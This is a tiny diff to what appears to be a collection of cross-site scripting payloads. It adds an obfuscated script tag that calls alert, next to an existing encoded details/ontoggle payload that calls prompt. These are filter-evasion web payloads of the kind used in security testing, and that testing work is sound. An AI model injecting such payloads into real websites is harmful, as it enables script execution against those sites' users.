@@ -3,4 +3,6 @@
 
 ```html
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+
+<script>top[8680439..toString(30)](1337)</script>
 ```
